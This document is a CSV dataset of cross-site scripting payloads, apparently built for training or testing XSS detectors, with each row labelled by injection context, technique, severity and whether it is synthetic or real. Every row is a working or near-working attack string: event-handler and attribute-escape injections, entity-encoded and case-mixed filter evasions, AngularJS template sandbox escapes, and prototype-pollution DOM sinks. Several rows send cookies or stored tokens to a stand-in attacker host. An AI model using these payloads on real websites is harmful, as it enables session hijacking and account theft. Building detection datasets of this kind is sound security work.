payload,context,technique,severity,length,source
%22 onhashchange=console.log(document.domain) %22,attribute_escape,synthetic,medium,49,synthetic
"""><BodY oNpoIntErmOve=alErt(loCatIon.haSh)>",tag_injection,synthetic,medium,43,synthetic
"""><Img srC=x onCopY=cOnsOle.loG(1)>",attribute_escape,synthetic,medium,35,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onw&#101;bkittr&#97;nsition&#101;nd"":&#97;l&#101;rt})",dom_sink,synthetic,low,85,synthetic
"<div draggable=""true"" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>",tag_injection,none,medium,113,real
{{!ready && (ready = true) && ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )));}},template_injection,none,medium,272,real
\' onkeydown=\u0061lert(location.hash)//,attribute_escape,synthetic,low,40,synthetic
\' OnbEfoRepAstE=pRomPt(1)//,attribute_escape,synthetic,medium,28,synthetic
"<h1 draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</h1>",tag_injection,none,medium,62,real
"__pRotO__[""oNanImaTioNstArt""]=XMLHttPReQueSt(StrIng.frOmCHarCodE(88,83,83))",dom_sink,synthetic,high,75,synthetic
"__proto__[""on&#97;nim&#97;tion&#101;nd""]=prompt('XSS')",dom_sink,synthetic,medium,54,synthetic
"<sup onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</sup>",tag_injection,none,medium,81,real
"<style>@keyframes slidein {}</style><nobr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nobr>",tag_injection,none,medium,162,real
%22><button ondragenter=alert(location.hash)>,tag_injection,synthetic,medium,45,synthetic
ontransitionstart=javascript:confirm(location.hash),event_handler,synthetic,medium,51,synthetic
'><img src=x onblur=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,low,58,synthetic
<mtExt/onEndEd=ConFirM(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,40,synthetic
"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",tag_injection,none,medium,109,real
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" ontransitionstart=alert(1)></fieldset>",tag_injection,none,medium,116,real
"EvaL(""ConFirM('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)"")",dom_sink,synthetic,high,53,synthetic
%27 ><svg onend=prompt(location.hash)>,attribute_escape,synthetic,medium,38,synthetic
"\"" onblur=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,low,49,synthetic
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:f&#101;tch(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))""",dom_sink,synthetic,low,113,synthetic
""" %3E%3Csvg ongotpointercapture=prompt('XSS')%3E",attribute_escape,synthetic,medium,48,synthetic
"""><img src=x onmouseup=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
<slot onpointermove=alert(1) style=display:block>AnonKryptiQuz</slot>,tag_injection,none,medium,69,real
"<hr oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,95,real
"__pRotO__[""oNblUr""]=cOnfIrm(doCumEnt.coOkiE)",dom_sink,synthetic,high,44,synthetic
\' OnsCroLlsNapChaNge=alErt('XSS')//,attribute_escape,synthetic,medium,36,synthetic
"""><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,106,synthetic
"<isindex draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</isindex>",tag_injection,none,medium,67,real
%3Cmarquee src=x onkeydown=confirm(1)%3E,tag_injection,synthetic,medium,40,synthetic
' ongesturestart=\u0061lert(location.hash) ',attribute_escape,synthetic,low,44,synthetic
<head id=x tabindex=1 onfocus=alert(1)></head>,tag_injection,none,medium,46,real
oninvalid=prompt/***/(1),event_handler,synthetic,low,24,synthetic
"__pRotO__[""oNfoCusIn""]=XMLHTtpReqUesT(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)",dom_sink,synthetic,high,76,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""f&#101;tch(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink,synthetic,low,109,synthetic
"<style>:target {color: red;}</style><col id=x style=""transition:color 10s"" ontransitioncancel=print()></col>",tag_injection,none,low,108,real
%27 onbeforematch=confirm(1) %27,attribute_escape,synthetic,medium,32,synthetic
javascript:void(prompt(location.hash)),js_uri,synthetic,medium,38,synthetic
"<em oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,96,real
"<abbr draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",tag_injection,none,medium,86,real
"<nav onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",tag_injection,none,medium,67,real
<hr onpointerout=alert(1) style=display:block>AnonKryptiQuz</hr>,tag_injection,none,medium,64,real
"'%3E%3Cimg src=x onpopstate=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,69,synthetic
<dfn onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</dfn><input value=clickme>,tag_injection,none,medium,97,real
"""><&#97; onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,low,88,synthetic
<sub onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
' ><svg onpageshow=console.log('XSS')>,attribute_escape,synthetic,medium,38,synthetic
%3Carea onclose=prompt(1) onclose=prompt(1)%3E,tag_injection,synthetic,medium,46,synthetic
<button popovertarget=x>Click me</button><fieldset onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</fieldset>,tag_injection,none,medium,112,real
&quot; onended=\u0061lert(1) x=&quot;,attribute_escape,synthetic,low,37,synthetic
"\%22 onplay=prompt(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,51,synthetic
OnpLayIng=jaVasCriPt:AleRt(1),event_handler,synthetic,medium,29,synthetic
oninvalid=confirm/*x*/(1),event_handler,synthetic,low,25,synthetic
<scr'+'ipt>alert(1)</scr'+'ipt>,generic,none,medium,31,real
<cite id=x tabindex=1 onbeforedeactivate=alert(1)></cite><input autofocus>,tag_injection,none,medium,74,real
<&#97;nim&#97;t&#101;tr&#97;nsform	onpoint&#101;rmov&#101;=consol&#101;.log('XSS')>,tag_injection,synthetic,low,83,synthetic
\%22 onanimationend=console.log(%27XSS%27)//,attribute_escape,synthetic,medium,44,synthetic
<summary onpointerup=alert(1) style=display:block>AnonKryptiQuz</summary>,tag_injection,none,medium,73,real
"__proto__[""ondr&#97;g&#101;nt&#101;r""]=prompt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink,synthetic,medium,104,synthetic
`><img src=x on&#97;uxclick=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,46,synthetic
<button popovertarget=x>Click me</button><q onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</q>,tag_injection,none,medium,98,real
' onpoint&#101;rr&#97;wupd&#97;t&#101;=prompt('XSS') ',attribute_escape,synthetic,medium,54,synthetic
"<img draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</img>",tag_injection,none,medium,84,real
"<img \x00src=x onerror=""alert(9919)"">",tag_injection,none,medium,37,real
"<!--><m&#97;rqu&#101;&#101; onpromptdismiss=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,101,synthetic
"&quot; onchange=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,63,synthetic
\' onmouseup=console.log('XSS')//,attribute_escape,synthetic,medium,33,synthetic
"ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(3844)"">DEF",js_uri,none,medium,67,real
<select onpointermove=prompt(%27XSS%27)/>,tag_injection,synthetic,medium,41,synthetic
 ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log('XSS'),event_handler,synthetic,low,58,synthetic
`><Img srC=x onDblCliCk=ConFirM(1)>,attribute_escape,synthetic,medium,35,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></article>",tag_injection,none,medium,184,real
"<applet onError applet onError=""javascript:javascript:alert(9815)""></applet onError>",js_uri,none,medium,84,real
<a/OnbEfoRemAtcH=pRomPt(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,41,synthetic
"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable style=display:block>drop here</li>",tag_injection,none,medium,125,real
	onk&#101;ydown=confirm(1),event_handler,synthetic,medium,26,synthetic
"<tfoot draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</tfoot>",tag_injection,none,medium,88,real
 onk&#101;ypr&#101;ss=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,54,synthetic
ondrop=\u0061lert(document.domain),event_handler,synthetic,low,34,synthetic
' ><svg ondr&#97;gst&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,low,68,synthetic
"<picture oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",tag_injection,none,medium,77,real
"<style>@keyframes slidein {}</style><script style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></script>",script_injection,none,medium,166,real
<param id=x tabindex=1 onfocus=alert(1)></param>,tag_injection,none,medium,48,real
__proto__[%22onfocusout%22]=prompt(document.cookie+%27&loc=%27+location.href),dom_sink,synthetic,high,77,synthetic
%3Cform src=x onpagereveal=console.log(location.hash)%3E,tag_injection,synthetic,medium,56,synthetic
"<!--><marquee onbeforetoggle=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,66,synthetic
'><img src=x ontouchend=\u0061lert('XSS')>,attribute_escape,synthetic,low,42,synthetic
"\' onreset=\u0061lert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,54,synthetic
' onprompt&#97;ction=consol&#101;.log('XSS') ',attribute_escape,synthetic,low,46,synthetic
OnpOinTerCanCel=jaVasCriPt:ConSolE.lOg(1),event_handler,synthetic,medium,41,synthetic
<template x=y onreset=alert(location.hash)>,tag_injection,synthetic,medium,43,synthetic
onpl&#97;ying=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,56,synthetic
"ontr&#97;nsitionst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,72,synthetic
<image3 onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</image3><input value=clickme>,tag_injection,none,medium,103,real
"j&#97;v&#97;script:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=consol&#101;.log('XSS') )//%0D%0A%0d%0&#97;",js_uri,synthetic,low,96,synthetic
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>,tag_injection,none,medium,60,real
"<li onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</li>",tag_injection,none,medium,65,real
{{constructor['constructor']('alert(document.domain)')()}},template_injection,synthetic,medium,58,synthetic
<seT oNweBkiTfuLlsCreEncHanGe=ConSolE.lOg('XSS')>,tag_injection,synthetic,medium,49,synthetic
"<em oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</em>",tag_injection,none,medium,56,real
%3Csvg onbeforecopy=prompt(document.domain)%3E,tag_injection,synthetic,medium,46,synthetic
&quOt; onBluR=pRomPt('XSS') x=&quOt;,attribute_escape,synthetic,medium,36,synthetic
"(new Function(""prompt(1)""))();",dom_sink,synthetic,high,30,synthetic
document.body.innerHTML=%22<img src=x onerror=XMLHttpRequest(document.cookie+%27&loc=%27+location.href)>%22,dom_sink,synthetic,high,107,synthetic
<button popovertarget=x>Click me</button><animate ontoggle=alert(1) popover id=x>AnonKryptiQuz</animate>,tag_injection,none,medium,104,real
"<dl draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</dl>",tag_injection,none,medium,82,real
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>",tag_injection,none,medium,107,real
' oNanImaTioNenD=cOnfIrm(doCumEnt.doMaiN) ',attribute_escape,synthetic,medium,43,synthetic
%22 oninput=confirm(1) %22,attribute_escape,synthetic,medium,26,synthetic
//j\\javascript:alert(document.domain),dom_sink,none,medium,38,real
"onbegin=confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,46,synthetic
"""><script+src=""http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()""></script>",script_injection,none,medium,99,real
"document.body.innerHTML=""%3Cimg src=x onerror=XMLHttpRequest(localStorage.getItem('token'))%3E""",dom_sink,synthetic,high,95,synthetic
<!--><&#97;udio onscroll&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,63,synthetic
onpaste=javascript:alert(1),event_handler,synthetic,medium,27,synthetic
{{constructor['constructor']('\u0061lert(document.domain)')()}},template_injection,synthetic,low,63,synthetic
"${{'\u0061lert(document.domain)'.replace('\u0061lert(document.domain)','')}}",template_injection,synthetic,low,76,synthetic
"' oNpoIntEroVer=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape,synthetic,high,56,synthetic
"""><Img srC=x onDblCliCk=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
""" ><svg on&#97;nim&#97;tion&#101;nd=confirm(1)>",attribute_escape,synthetic,medium,47,synthetic
"\' ontouchstart=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,56,synthetic
{{$On.ConStrUctOr('coNfiRm(DocUmeNt.CooKie)')()}},template_injection,synthetic,high,49,synthetic
"__proto__[""onanimationiteration""]=console.log(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,76,synthetic
	onlo&#97;d=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,44,synthetic
%27 ><svg ongotpointercapture=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,53,synthetic
"%3Ctr
onanimationend=prompt('XSS')%3E",tag_injection,synthetic,medium,37,synthetic
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,89,synthetic
' onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,58,synthetic
"__pRotO__[""oNfoCusOut""]=ProMpt(naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))",dom_sink,synthetic,high,86,synthetic
ontouchend=alert/***/(location.hash),event_handler,synthetic,low,36,synthetic
\' onb&#101;for&#101;m&#97;tch=&#97;l&#101;rt('XSS')//,attribute_escape,synthetic,low,54,synthetic
`><Img srC=x onMouSeeNteR=aLerT(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,49,synthetic
"\"" OnpRomPtdIsmIss=alErt(doCumEnt.doMaiN)//",attribute_escape,synthetic,medium,43,synthetic
"""><&#101;mb&#101;d onmous&#101;&#101;nt&#101;r=confirm('XSS')>",tag_injection,synthetic,medium,62,synthetic
"""><BasE oNinPut=alErt('XSS')>",tag_injection,synthetic,medium,29,synthetic
'>'><SCript>alert(2);</script>,script_injection,case_variation,medium,30,real
' oNprOmpTacTioN=pRomPt(LocAtiOn.HasH) ',attribute_escape,synthetic,medium,40,synthetic
`><img src=x onscrollsn&#97;pch&#97;ng&#101;=confirm('XSS')>,attribute_escape,synthetic,medium,60,synthetic
' oNpaGesHow=coNfiRm(DocUmeNt.DomAin) ',attribute_escape,synthetic,medium,39,synthetic
"<mark draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",tag_injection,none,medium,86,real
'><img src=x oninvalid=\u0061lert(document.domain)>,attribute_escape,synthetic,low,51,synthetic
"<content onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</content>",tag_injection,none,medium,72,real
"<obj&#101;ct
onw&#101;bkit&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,low,90,synthetic
&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;,generic,html_entity,medium,49,real
%3Cscript%3E//prompt(document.domain)%3C/script%3E,script_injection,synthetic,medium,50,synthetic
"<command onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></command>",tag_injection,none,medium,287,real
"<iframe
onsecuritypolicyviolation=confirm(%27XSS%27)>",tag_injection,synthetic,medium,53,synthetic
onkeydown=confirm('XSS'),event_handler,synthetic,medium,24,synthetic
&quot; onp&#97;g&#101;r&#101;v&#101;&#97;l=consol&#101;.log(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape,synthetic,low,94,synthetic
%3Cvideo x=y onclick=console.log('XSS')%3E,tag_injection,synthetic,medium,42,synthetic
<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>,tag_injection,none,medium,68,real
onrepeat=javascript:\u0061lert(location.hash),event_handler,synthetic,low,45,synthetic
"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;XSS&lt;/A&gt;",generic,html_entity,low,58,real
onfocus=javascript:alert(location.hash),event_handler,synthetic,medium,39,synthetic
"JavAscRipT:/*-/*`/*\`/*'/*""/**/(/* */oNCliCk=ConFirM('XSS') )//%0D%0A%0d%0a",js_uri,synthetic,medium,75,synthetic
"<a href=""\xE2\x80\x81javascript:javascript:alert(8888)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82,real
"\"" on&#101;nd&#101;d=consol&#101;.log(docum&#101;nt.dom&#97;in)//",attribute_escape,synthetic,low,65,synthetic
&quot; ontouchend=confirm('XSS') x=&quot;,attribute_escape,synthetic,medium,41,synthetic
on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,70,synthetic
&quot; onk&#101;ypr&#101;ss=confirm('XSS') x=&quot;,attribute_escape,synthetic,medium,51,synthetic
"<div id=""128""><svg><style>&lt;img/src=x onerror=alert(128)// </b>//[""'`-->]]>]</div>",attribute_escape,none,medium,84,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))>"")",dom_sink,synthetic,medium,160,synthetic
"\' onmous&#101;&#101;nt&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,89,synthetic
%3Cscript%3E//confirm(1)%3C/script%3E,script_injection,synthetic,medium,37,synthetic
<button onclick=console.log(1) onclick=console.log(1)>,tag_injection,synthetic,medium,54,synthetic
"(new Function(""alert(document.domain)""))();",dom_sink,synthetic,high,43,synthetic
"<noframes draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</noframes>",tag_injection,none,medium,74,real
"""><img src=x onpoint&#101;rr&#97;wupd&#97;t&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,98,synthetic
